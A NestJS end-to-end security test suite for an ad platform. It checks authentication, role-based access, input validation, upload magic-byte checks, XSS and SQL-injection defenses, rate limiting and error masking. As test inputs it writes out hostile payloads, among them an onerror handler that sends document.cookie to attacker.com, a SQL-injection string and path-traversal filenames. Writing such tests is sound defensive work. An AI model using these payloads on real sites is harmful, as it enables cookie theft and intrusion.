import { Test, TestingModule } from '@nestjs/testing';
import {
  INestApplication,
  ValidationPipe,
  Controller,
  Get,
  UseGuards,
} from '@nestjs/common';
import * as request from 'supertest';
import * as cookieParser from 'cookie-parser';
import { json, urlencoded } from 'express';
import { JwtService } from '@nestjs/jwt';
import { AppModule } from '../src/app.module';
import { AuthService } from '../src/auth/auth.service';
import { PrismaService } from '../src/prisma/prisma.service';
import { TrackingTokenService } from '../src/ads/services/tracking-token.service';
import { AiRateLimiterService } from '../src/ai/services/ai-rate-limiter.service';
import { AnalyticsDeduplicationService } from '../src/analytics/services/analytics-deduplication.service';
import { UtilitiesCacheService } from '../src/utilities/services/utilities-cache.service';
import { GlobalExceptionFilter } from '../src/common/filters/global-exception.filter';
import {
  sanitizeFilename,
  validateJpegMagicBytes,
  validatePngMagicBytes,
  validatePdfMagicBytes,
} from '../src/utilities/adapters/utils/buffer-utils';
import { JwtAuthGuard } from '../src/auth/guards/jwt-auth.guard';
import { RolesGuard } from '../src/auth/guards/roles.guard';
import { PermissionsGuard } from '../src/auth/guards/permissions.guard';
import { Roles } from '../src/auth/decorators/roles.decorator';
import { RequirePermissions } from '../src/auth/decorators/permissions.decorator';

// Test Controller to verify simulated unhandled errors & stack trace masking
@Controller('test-security')
class TestSecurityController {
  @Get('unhandled-error')
  unhandledError() {
    throw new Error('Database connection failed: SELECT * FROM "secrets" WHERE id = 123');
  }

  @Get('admin-action')
  @UseGuards(JwtAuthGuard, RolesGuard, PermissionsGuard)
  @RequirePermissions('users:manage')
  adminAction() {
    return { success: true, message: 'Admin permitted' };
  }
}

jest.setTimeout(35000);

describe('Phase 11: Security Hardening & Resilience Verification', () => {
  let app: INestApplication;
  let authService: AuthService;
  let prisma: PrismaService;
  let jwtService: JwtService;
  let trackingTokenService: TrackingTokenService;
  let aiRateLimiterService: AiRateLimiterService;
  let analyticsDedupService: AnalyticsDeduplicationService;
  let utilitiesCacheService: UtilitiesCacheService;

  let superAdminToken: string;
  let editorToken: string;
  let analystToken: string;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
      controllers: [TestSecurityController],
    }).compile();

    app = moduleFixture.createNestApplication();

    // Body parser limits for large payload handling
    app.use(json({ limit: '60mb' }));
    app.use(urlencoded({ extended: true, limit: '60mb' }));

    // Disable X-Powered-By
    app.getHttpAdapter().getInstance().disable('x-powered-by');

    // Security Headers Middleware
    app.use((_req: any, res: any, next: () => void) => {
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('X-Frame-Options', 'SAMEORIGIN');
      res.setHeader('X-XSS-Protection', '1; mode=block');
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
      next();
    });

    app.use(cookieParser());
    app.setGlobalPrefix('api/v1');
    app.useGlobalPipes(
      new ValidationPipe({
        whitelist: true,
        forbidNonWhitelisted: true,
        transform: true,
      }),
    );
    app.useGlobalFilters(new GlobalExceptionFilter());

    await app.init();

    authService = moduleFixture.get<AuthService>(AuthService);
    prisma = moduleFixture.get<PrismaService>(PrismaService);
    jwtService = moduleFixture.get<JwtService>(JwtService);
    trackingTokenService = moduleFixture.get<TrackingTokenService>(TrackingTokenService);
    aiRateLimiterService = moduleFixture.get<AiRateLimiterService>(AiRateLimiterService);
    analyticsDedupService = moduleFixture.get<AnalyticsDeduplicationService>(AnalyticsDeduplicationService);
    utilitiesCacheService = moduleFixture.get<UtilitiesCacheService>(UtilitiesCacheService);

    // Obtain tokens for authenticated testing
    const adminLogin = await authService.login({
      email: 'admin@adplatform.local',
      password: 'AdminSecurePassword123!',
    });
    superAdminToken = adminLogin.accessToken;

    const editorLogin = await authService.login({
      email: 'editor@adplatform.local',
      password: 'AdminSecurePassword123!',
    });
    editorToken = editorLogin.accessToken;

    const analystLogin = await authService.login({
      email: 'analyst@adplatform.local',
      password: 'AdminSecurePassword123!',
    });
    analystToken = analystLogin.accessToken;
  });

  afterAll(async () => {
    await app.close();
  });

  // =========================================================================
  // 1. AUTHENTICATION HARDENING
  // =========================================================================
  describe('1. Authentication Hardening & Token Security', () => {
    it('should reject login with wrong password without leaking user existence', async () => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ email: 'admin@adplatform.local', password: 'WrongPassword123!' })
        .expect(401);

      expect(res.body.message).toBe('Invalid email or password');
    });

    it('should reject login for non-existent email with identical message (no user enumeration)', async () => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ email: 'nonexistent_user@adplatform.local', password: 'AnyPassword123!' })
        .expect(401);

      expect(res.body.message).toBe('Invalid email or password');
    });

    it('should reject login for deactivated user account with HTTP 403', async () => {
      // Temporarily deactivate a test user or create inactive user
      const inactiveEmail = 'inactive_test_user@adplatform.local';
      await prisma.user.upsert({
        where: { email: inactiveEmail },
        update: { isActive: false },
        create: {
          email: inactiveEmail,
          passwordHash: '$2a$10$abcdefghijklmnopqrstuv',
          firstName: 'Inactive',
          lastName: 'User',
          isActive: false,
        },
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ email: inactiveEmail, password: 'AdminSecurePassword123!' })
        .expect(403);

      expect(res.body.message).toMatch(/deactivated/i);

      // Clean up
      await prisma.user.deleteMany({ where: { email: inactiveEmail } });
    });

    it('should reject malformed JWT authorization header', async () => {
      await request(app.getHttpServer())
        .get('/api/v1/auth/me')
        .set('Authorization', 'Bearer not.a.valid.jwt.token')
        .expect(401);
    });

    it('should reject forged JWT signed with an invalid secret key', async () => {
      const forgedToken = jwtService.sign(
        { sub: 'hacked-admin-id', roles: ['SUPER_ADMIN'] },
        { secret: 'attacker_fake_secret_key_1234567890' },
      );

      await request(app.getHttpServer())
        .get('/api/v1/auth/me')
        .set('Authorization', `Bearer ${forgedToken}`)
        .expect(401);
    });

    it('should reject expired JWT token', async () => {
      const expiredToken = jwtService.sign(
        { sub: 'test-user-id', roles: ['EDITOR'] },
        {
          secret: process.env.JWT_SECRET || 'super_secret_jwt_key_change_in_production_min_32_chars',
          expiresIn: '-10s',
        },
      );

      await request(app.getHttpServer())
        .get('/api/v1/auth/me')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);
    });

    it('should reject invalid or manipulated refresh token on refresh endpoint', async () => {
      await request(app.getHttpServer())
        .post('/api/v1/auth/refresh')
        .send({ refreshToken: 'invalid.refresh.token.signature' })
        .expect(401);
    });
  });

  // =========================================================================
  // 2. AUTHORIZATION & RBAC PRIVILEGE ESCALATION
  // =========================================================================
  describe('2. Authorization & Vertical Privilege Escalation Prevention', () => {
    it('should deny unauthenticated requests to protected admin endpoints with HTTP 401', async () => {
      await request(app.getHttpServer())
        .get('/api/v1/admin/users')
        .expect(401);
    });

    it('should block ANALYST role from mutating users (vertical privilege escalation) with HTTP 403', async () => {
      await request(app.getHttpServer())
        .post('/api/v1/admin/users')
        .set('Authorization', `Bearer ${analystToken}`)
        .send({
          email: 'escalated@adplatform.local',
          password: 'Password123!',
          firstName: 'Attacker',
          lastName: 'User',
          roleNames: ['ADMIN'],
        })
        .expect(403);
    });

    it('should block EDITOR role from modifying platform settings with HTTP 403', async () => {
      await request(app.getHttpServer())
        .patch('/api/v1/admin/settings/site_name')
        .set('Authorization', `Bearer ${editorToken}`)
        .send({ value: { name: 'Hacked Platform' } })
        .expect(403);
    });

    it('should allow SUPER_ADMIN to execute administrative actions', async () => {
      const res = await request(app.getHttpServer())
        .get('/api/v1/admin/users')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .expect(200);

      expect(res.body.success).toBe(true);
      expect(Array.isArray(res.body.data.items)).toBe(true);
    });
  });

  // =========================================================================
  // 3. INPUT VALIDATION & DTO ENFORCEMENT
  // =========================================================================
  describe('3. Strict DTO Input Validation & Non-Whitelisted Property Rejection', () => {
    it('should reject requests containing non-whitelisted attributes (forbidNonWhitelisted)', async () => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({
          email: 'admin@adplatform.local',
          password: 'AdminSecurePassword123!',
          isAdminInjection: true, // Non-whitelisted field
        })
        .expect(400);

      expect(res.body.message).toEqual(
        expect.arrayContaining([expect.stringMatching(/property isAdminInjection should not exist/i)]),
      );
    });

    it('should reject malformed email formats with HTTP 400', async () => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({
          email: 'not-an-email-address',
          password: 'AdminSecurePassword123!',
        })
        .expect(400);

      expect(res.body.message).toEqual(
        expect.arrayContaining([expect.stringMatching(/invalid email/i)]),
      );
    });

    it('should reject empty or whitespace passwords with HTTP 400', async () => {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({
          email: 'admin@adplatform.local',
          password: '   ',
        })
        .expect(400);
    });
  });

  // =========================================================================
  // 4. FILE UPLOAD & PROCESSING SECURITY
  // =========================================================================
  describe('4. File Upload Security & Magic Byte Signature Enforcement', () => {
    it('should reject text or script payload disguised with .jpg extension via magic bytes check', async () => {
      const fakeJpgData = Buffer.from('console.log("Malicious Javascript Execution");').toString('base64');

      const res = await request(app.getHttpServer())
        .post('/api/v1/utilities/jpg-to-png/execute')
        .send({
          input: {
            fileData: `data:image/jpeg;base64,${fakeJpgData}`,
            filename: 'exploit.jpg',
          },
        })
        .expect(400);

      expect(res.body.message).toMatch(/magic bytes mismatch|not a valid JPEG/i);
    });

    it('should reject text payload disguised with .png extension via PNG magic bytes check', async () => {
      const fakePngData = Buffer.from('NOT A VALID PNG HEADER').toString('base64');

      const res = await request(app.getHttpServer())
        .post('/api/v1/utilities/png-to-jpg/execute')
        .send({
          input: {
            fileData: `data:image/png;base64,${fakePngData}`,
            filename: 'fake.png',
          },
        })
        .expect(400);

      expect(res.body.message).toMatch(/magic bytes mismatch|not a valid PNG/i);
    });

    it('should reject non-PDF binary payload disguised with .pdf extension', async () => {
      const fakePdfData = Buffer.from('MZ\x90\x00\x03\x00\x00\x00Windows Executable').toString('base64');

      const res = await request(app.getHttpServer())
        .post('/api/v1/utilities/pdf-compressor/execute')
        .send({
          input: {
            fileData: `data:application/pdf;base64,${fakePdfData}`,
            filename: 'payload.pdf',
          },
        })
        .expect(400);

      expect(res.body.message).toMatch(/executable binary detected|missing %PDF- header|not a valid PDF/i);
    });

    it('should reject truncated or corrupted image data gracefully without process crash', async () => {
      // JPEG header + corrupted garbage
      const corruptedJpg = Buffer.from([0xff, 0xd8, 0xff, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00]).toString('base64');

      const res = await request(app.getHttpServer())
        .post('/api/v1/utilities/jpg-to-png/execute')
        .send({
          input: {
            fileData: `data:image/jpeg;base64,${corruptedJpg}`,
            filename: 'corrupted.jpg',
          },
        })
        .expect(400);

      expect(res.body.message).toMatch(/Failed to decode JPEG/i);
    });

    it('should sanitize path traversal attempts in filename to prevent arbitrary file manipulation', () => {
      const traversalName1 = '../../../../etc/passwd';
      const traversalName2 = '..\\..\\Windows\\System32\\cmd.exe';
      const nullByteName = 'clean_name\0.php.jpg';

      expect(sanitizeFilename(traversalName1)).toBe('passwd');
      expect(sanitizeFilename(traversalName2)).toBe('cmd.exe');
      expect(sanitizeFilename(nullByteName)).toBe('clean_name.php.jpg');
      expect(sanitizeFilename('..')).toBe('file');
      expect(sanitizeFilename('')).toBe('file');
    });

    it('should reject oversized image files exceeding the 15MB limit', async () => {
      // Create valid JPEG header followed by mock oversized buffer (16MB)
      const oversizedBuffer = Buffer.alloc(16 * 1024 * 1024);
      oversizedBuffer[0] = 0xff;
      oversizedBuffer[1] = 0xd8;
      oversizedBuffer[2] = 0xff;

      const oversizedData = oversizedBuffer.toString('base64');

      const res = await request(app.getHttpServer())
        .post('/api/v1/utilities/jpg-to-png/execute')
        .send({
          input: {
            fileData: oversizedData,
            filename: 'huge.jpg',
          },
        })
        .expect(400);

      expect(res.body.message).toMatch(/exceeds the 15MB limit/i);
    });
  });

  // =========================================================================
  // 5. INJECTION & XSS DEFENSE
  // =========================================================================
  describe('5. Injection & Cross-Site Scripting (XSS) Hardening', () => {
    it('should neutralize SQL injection patterns in search query parameters', async () => {
      const sqliPayload = "' OR '1'='1' --";
      const res = await request(app.getHttpServer())
        .get(`/api/v1/admin/users?search=${encodeURIComponent(sqliPayload)}`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .expect(200);

      // Prisma parameterized query treats payload as literal string, returning 0 matches without SQL syntax error
      expect(res.body.success).toBe(true);
      expect(res.body.data.items).toEqual([]);
    });

    it('should reject custom HTML creative containing executable <script> tags with HTTP 400', async () => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/admin/ads/creatives')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          name: 'Malicious XSS Banner',
          type: 'HTML',
          customHtml: '<div class="banner">Buy Now</div><script>alert(document.cookie);</script>',
        })
        .expect(400);

      expect(res.body.message).toMatch(/Unsafe script execution or event handler detected/i);
    });

    it('should reject custom HTML creative containing inline event handlers like onerror=', async () => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/admin/ads/creatives')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          name: 'Malicious Event Handler Banner',
          type: 'HTML',
          customHtml: '<img src="invalid" onerror="fetch(\'http://attacker.com?c=\'+document.cookie)" />',
        })
        .expect(400);

      expect(res.body.message).toMatch(/Unsafe script execution or event handler detected/i);
    });

    it('should allow clean, safe HTML banner markup without scripts', async () => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/admin/ads/creatives')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          name: 'Clean HTML Banner',
          type: 'HTML',
          customHtml: '<div class="p-4 bg-blue-600 text-white font-bold">Special Promotion!</div>',
        })
        .expect(201);

      expect(res.body.success).toBe(true);
      expect(res.body.data.name).toBe('Clean HTML Banner');

      // Clean up
      await prisma.adCreative.deleteMany({ where: { id: res.body.data.id } });
    });
  });

  // =========================================================================
  // 6. RATE LIMITING & ABUSE PREVENTION
  // =========================================================================
  describe('6. Rate Limiting & Telemetry Abuse Prevention', () => {
    it('should block burst AI requests exceeding the sliding window threshold', async () => {
      const testIdentifier = 'test_abuse_client_ip';

      // First 10 requests allowed
      for (let i = 0; i < 10; i++) {
        const check = await aiRateLimiterService.checkRateLimit(testIdentifier, 10);
        expect(check.allowed).toBe(true);
      }

      // 11th request in the same 60s window must be blocked
      const burstCheck = await aiRateLimiterService.checkRateLimit(testIdentifier, 10);
      expect(burstCheck.allowed).toBe(false);
      expect(burstCheck.remaining).toBe(0);
    });

    it('should deduplicate repeated analytics events with identical eventId', () => {
      const eventId = 'unique-test-telemetry-event-12345';

      const firstCheck = analyticsDedupService.isDuplicate(eventId);
      expect(firstCheck).toBe(false);

      const secondCheck = analyticsDedupService.isDuplicate(eventId);
      expect(secondCheck).toBe(true);
    });

    it('should reject forged ad tracking tokens on click with HTTP 400', async () => {
      const forgedToken = 'eyJjcmVhdGl2ZUlkIjoiMTIzIn0.invalid_forged_hmac_signature';

      await request(app.getHttpServer())
        .post('/api/v1/ads/click')
        .send({
          trackingToken: forgedToken,
        })
        .expect(400);
    });

    it('should discard forged tracking tokens on impression without recording', async () => {
      const forgedToken = 'eyJjcmVhdGl2ZUlkIjoiMTIzIn0.invalid_forged_hmac_signature';

      const res = await request(app.getHttpServer())
        .post('/api/v1/ads/impression')
        .send({
          trackingToken: forgedToken,
          placement: 'HEADER_BANNER',
        })
        .expect(200);

      expect(res.body.data.recorded).toBe(false);
    });

    it('should reject expired ad tracking tokens older than 24 hours', () => {
      const expiredTimestamp = Date.now() - 25 * 60 * 60 * 1000; // 25 hours ago
      const token = trackingTokenService.generateToken({
        creativeId: 'c-1',
        campaignId: 'camp-1',
        placementId: 'p-1',
        placementCode: 'HEADER_BANNER' as any,
      });

      // Craft expired token using internal helper logic
      const parts = token.split('.');
      const payload = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
      payload.timestamp = expiredTimestamp;

      const expiredSerialized = Buffer.from(JSON.stringify(payload)).toString('base64url');
      const crypto = require('crypto');
      const secret = process.env.JWT_SECRET || 'fallback_ad_tracking_secret_min_32_characters_here';
      const expiredSignature = crypto.createHmac('sha256', secret).update(expiredSerialized).digest('base64url');
      const expiredToken = `${expiredSerialized}.${expiredSignature}`;

      expect(() => trackingTokenService.verifyToken(expiredToken)).toThrow(/Expired tracking token/i);
    });
  });

  // =========================================================================
  // 7. SECURITY HEADERS & INFORMATION DISCLOSURE
  // =========================================================================
  describe('7. Security Headers & Information Leakage Prevention', () => {
    it('should return standard security headers on all HTTP responses', async () => {
      const res = await request(app.getHttpServer())
        .get('/api/v1/health')
        .expect(200);

      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['x-frame-options']).toBe('SAMEORIGIN');
      expect(res.headers['x-xss-protection']).toBe('1; mode=block');
      expect(res.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    });

    it('should omit X-Powered-By header from HTTP responses', async () => {
      const res = await request(app.getHttpServer())
        .get('/api/v1/health')
        .expect(200);

      expect(res.headers['x-powered-by']).toBeUndefined();
    });

    it('should mask unexpected internal errors without leaking SQL queries or stack traces', async () => {
      const res = await request(app.getHttpServer())
        .get('/api/v1/test-security/unhandled-error')
        .expect(500);

      expect(res.body.statusCode).toBe(500);
      expect(res.body.message).toBe('An unexpected internal error occurred');
      expect(res.body.error).toBe('InternalServerError');
      expect(res.body.stack).toBeUndefined(); // Stack trace must NEVER leak
      expect(JSON.stringify(res.body)).not.toMatch(/SELECT \* FROM/i); // SQL query must NEVER leak
    });
  });

  // =========================================================================
  // 8. RESILIENCE & GRACEFUL DEGRADATION
  // =========================================================================
  describe('8. Resilience & Graceful Degradation', () => {
    it('should fail-open gracefully when Redis cache encounters errors', async () => {
      // Mock internal cache get to reject simulating a Redis drop
      jest.spyOn(utilitiesCacheService, 'get').mockRejectedValueOnce(new Error('Redis connection refused'));

      // The categories endpoint should still return HTTP 200 by falling back to DB
      const res = await request(app.getHttpServer())
        .get('/api/v1/utilities/categories')
        .expect(200);

      expect(res.body.success).toBe(true);
      expect(Array.isArray(res.body.data)).toBe(true);

      jest.restoreAllMocks();
    });

    it('should return controlled HTTP 503 when utility DB record exists but code adapter is missing', async () => {
      // Create temporary mock utility without registered adapter
      const orphanSlug = 'orphan-test-utility-slug';
      const imageCat = await prisma.utilityCategory.findUnique({ where: { slug: 'image' } });

      if (imageCat) {
        await prisma.utility.createMany({
          data: [
            {
              slug: orphanSlug,
              name: 'Orphan Tool',
              description: 'No adapter',
              categoryId: imageCat.id,
              implementationMode: 'SERVER',
              status: 'ACTIVE',
              seoTitle: 'Orphan Tool',
              seoDescription: 'Orphan Description',
            },
          ],
        });

        const res = await request(app.getHttpServer())
          .post(`/api/v1/utilities/${orphanSlug}/execute`)
          .send({ input: {} })
          .expect(503);

        expect(res.body.message).toMatch(/not available in this environment/i);

        // Clean up
        await prisma.utility.deleteMany({ where: { slug: orphanSlug } });
      }
    });
  });
});
